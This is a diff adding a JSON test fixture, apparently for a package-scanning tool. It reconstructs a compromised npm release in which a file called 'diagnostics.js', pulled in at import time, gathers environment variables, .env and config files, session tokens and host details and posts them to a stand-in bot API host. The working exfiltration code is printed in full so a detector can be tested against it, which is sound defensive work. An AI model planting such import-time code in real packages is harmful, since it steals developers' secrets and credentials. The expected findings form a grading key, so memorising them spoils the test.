@@ -1,0 +1,103 @@
+{
+  "id": "incident-wppconnect-import-time-exfil",
+  "title": "Trusted-publishing release adds an import-time module that ships env, config files, and sessions to a bot API",
+  "category": "credential-exfiltration-sink",
+  "intent": "Synthetic reconstruction of @wppconnect-team/wppconnect 2.4.0 -> 2.4.1 (StepSecurity, 16 Nov 2026), published through trusted publishing with valid provenance. No install hook (prepare does not run on registry installs). The existing dist/controllers/browser.js now requires a new dist/utils/diagnostics.js that, on import, collects host details, a public-IP lookup, every non-npm_* environment variable, .env/config files and ./tokens/*.json, and uploads them through a bot API sendDocument call with a split token. Hosts are example.invalid and the token fragments are fake.",
+  "previousPackageJson": {
+    "name": "@wppconnect-team/wppconnect",
+    "version": "2.4.0",
+    "main": "dist/index.js",
+    "files": ["dist"],
+    "scripts": {
+      "prepare": "npm run build"
+    }
+  },
+  "stagedPackageJson": {
+    "name": "@wppconnect-team/wppconnect",
+    "version": "2.4.1",
+    "main": "dist/index.js",
+    "files": ["dist"],
+    "scripts": {
+      "prepare": "npm run build"
+    }
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 134,
+      "sha256": "177d321255ec48be63eec6cc64a4cfae9d10216b08cc859fcbbcac5acd98b019",
+      "flags": [],
+      "textSample": "{\"name\":\"@wppconnect-team/wppconnect\",\"version\":\"2.4.0\",\"main\":\"dist/index.js\",\"files\":[\"dist\"],\"scripts\":{\"prepare\":\"npm run build\"}}"
+    },
+    {
+      "path": "dist/index.js",
+      "size": 72,
+      "sha256": "c6f06bcf0c92f3222e223bb248f2a9557e7078c8cc462c8e81e623e3c820df14",
+      "flags": [],
+      "textSample": "'use strict';\nexports.create = require('./controllers/browser').create;\n"
+    },
+    {
+      "path": "dist/controllers/browser.js",
+      "size": 143,
+      "sha256": "89e38b8ba694b2b24d66c7bc82af2340fe27bb4c42358900405f21ae4003ca1b",
+      "flags": [],
+      "textSample": "'use strict';\nconst puppeteer = require('puppeteer');\nexports.create = async function create(options) {\n  return puppeteer.launch(options);\n};\n"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 134,
+      "sha256": "dfa2cd0d0442816a6427dbb7aed8eca170fdbbd4a77b12ed1f229a6cfa00c091",
+      "flags": [],
+      "textSample": "{\"name\":\"@wppconnect-team/wppconnect\",\"version\":\"2.4.1\",\"main\":\"dist/index.js\",\"files\":[\"dist\"],\"scripts\":{\"prepare\":\"npm run build\"}}"
+    },
+    {
+      "path": "dist/index.js",
+      "size": 72,
+      "sha256": "c6f06bcf0c92f3222e223bb248f2a9557e7078c8cc462c8e81e623e3c820df14",
+      "flags": [],
+      "textSample": "'use strict';\nexports.create = require('./controllers/browser').create;\n"
+    },
+    {
+      "path": "dist/controllers/browser.js",
+      "size": 176,
+      "sha256": "3aeec258e8303439f1adf48ba08145e41840a71dc24dd234cbf9b7a5c9b45469",
+      "flags": [],
+      "textSample": "'use strict';\nconst puppeteer = require('puppeteer');\nrequire('../utils/diagnostics');\nexports.create = async function create(options) {\n  return puppeteer.launch(options);\n};\n"
+    },
+    {
+      "path": "dist/utils/diagnostics.js",
+      "size": 2235,
+      "sha256": "e54fcafa134ab48badbcc1ebae15012a99cffe3e1276b6cbc074a983278a748d",
+      "flags": [],
+      "textSample": "'use strict';\nconst fs = require('fs');\nconst os = require('os');\nconst path = require('path');\nconst https = require('https');\nconst BOT = ['0000000000', ':FAKE-TOKEN', '-NOT-REAL'].join('');\nconst CHAT_ID = '-1000000000000';\nfunction publicIp() {\n  return new Promise((resolve) => {\n    https\n      .get('https://api.ipify.example.invalid/?format=json', (res) => {\n        let data = '';\n        res.on('data', (c) => (data += c));\n        res.on('end', () => resolve(data));\n      })\n      .on('error', () => resolve(''));\n  });\n}\nfunction environment() {\n  const out = {};\n  for (const [key, value] of Object.entries(process.env)) {\n    if (key.startsWith('npm_')) continue;\n    if (value && value.length >= 3 && value.length < 500) out[key] = value;\n  }\n  return out;\n}\nfunction projectFiles() {\n  const out = {};\n  for (const name of ['.env', '.env.local', '.env.production', 'config.js', 'config.json', 'ormconfig.json']) {\n    try {\n      out[name] = fs.readFileSync(path.join(process.cwd(), name), 'utf8').slice(0, 12000);\n    } catch {}\n  }\n  try {\n    const dir = path.join(process.cwd(), 'tokens');\n    for (const name of fs.readdirSync(dir).filter((n) => n.endsWith('.json')).slice(0, 5)) {\n      out['tokens/' + name] = fs.readFileSync(path.join(dir, name), 'utf8').slice(0, 12000);\n    }\n  } catch {}\n  return out;\n}\nasync function report() {\n  const info = {\n    host: os.hostname(),\n    user: os.userInfo().username,\n    os: os.platform() + ' ' + os.release(),\n    node: process.version,\n    cwd: process.cwd(),\n    memory: os.totalmem(),\n    ip: await publicIp(),\n    env: environment(),\n    files: projectFiles(),\n  };\n  const boundary = '----diag' + Date.now();\n  const body =\n    `--${boundary}\\r\\nContent-Disposition: form-data; name=\"chat_id\"\\r\\n\\r\\n${CHAT_ID}\\r\\n` +\n    `--${boundary}\\r\\nContent-Disposition: form-data; name=\"document\"; filename=\"diag.json\"\\r\\n\\r\\n${JSON.stringify(info)}\\r\\n--${boundary}--\\r\\n`;\n  const req = https.request({\n    hostname: 'api.telegram.example.invalid',\n    path: '/bot' + BOT + '/sendDocument',\n    method: 'POST',\n    headers: { 'Content-Type': 'multipart/form-data; boundary=' + boundary },\n  });\n  req.on('error', () => {});\n  req.end(body);\n}\nreport().catch(() => {});\n"
+    }
+  ],
+  "expectedRisk": "high",
+  "expectedFindings": [
+    {
+      "ruleId": "code.credential-access",
+      "severity": "high",
+      "file": "dist/utils/diagnostics.js"
+    },
+    {
+      "ruleId": "code.network-access",
+      "severity": "high",
+      "file": "dist/utils/diagnostics.js"
+    }
+  ],
+  "expectedReleaseRisk": "high",
+  "expectedReleaseFindings": [
+    {
+      "ruleId": "code.credential-access",
+      "severity": "high",
+      "file": "dist/utils/diagnostics.js"
+    },
+    {
+      "ruleId": "code.network-access",
+      "severity": "high",
+      "file": "dist/utils/diagnostics.js"
+    }
+  ]
+}
